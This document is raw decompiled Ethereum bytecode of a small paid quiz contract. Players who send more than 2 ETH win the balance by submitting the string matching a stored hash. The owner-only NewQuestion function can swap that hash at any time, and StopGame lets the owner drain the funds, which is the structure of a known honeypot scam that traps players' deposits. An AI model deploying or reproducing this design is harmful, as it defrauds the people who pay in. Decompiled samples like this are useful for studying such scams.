contract main {


// =======================  Init code  ======================


const _fallback = code.data[30 len 1412]




// =====================  Runtime code  =====================


array of uint256 question;
address stor1;
uint256 stor2;

function question() {
    return question[0 len question.length]
}

function _fallback() payable {
  stop
}

function newQuestioner(address arg1) {
    if stor1 == msg.sender:
        stor1 = arg1
}

function NewQuestion(string arg1, bytes32 arg2) payable {
    if stor1 == msg.sender:
        question[] = Array(len=arg1.length, data=arg1[all])
        stor2 = arg2
}

function StopGame() payable {
    require stor1 == msg.sender
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    require ext_call.success
}

function Try(string arg1) payable {
    require msg.sender == tx.origin
    if stor2 == sha3(arg1[all]):
        if msg.value > 2 * 10^18:
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            require ext_call.success
}

function set_game(string arg1, string arg2) payable {
    mem[ceil32(arg1.length) + 160 len arg2.length] = arg2[all]
    if not stor2:
        mem[ceil32(arg1.length) + ceil32(arg2.length) + 160 len floor32(arg2.length)] = call.data[arg2 + 36 len floor32(arg2.length)]
        mem[ceil32(arg1.length) + ceil32(arg2.length) + floor32(arg2.length) + -(arg2.length % 32) + 192 len arg2.length % 32] = mem[ceil32(arg1.length) + -(arg2.length % 32) + floor32(arg2.length) + 192 len arg2.length % 32]
        stor2 = sha3(call.data[arg2 + 36 len floor32(arg2.length)], mem[ceil32(arg1.length) + ceil32(arg2.length) + floor32(arg2.length) + 160 len arg2.length % 32])
        question[] = Array(len=arg1.length, data=arg1[all])
        stor1 = msg.sender
}



}
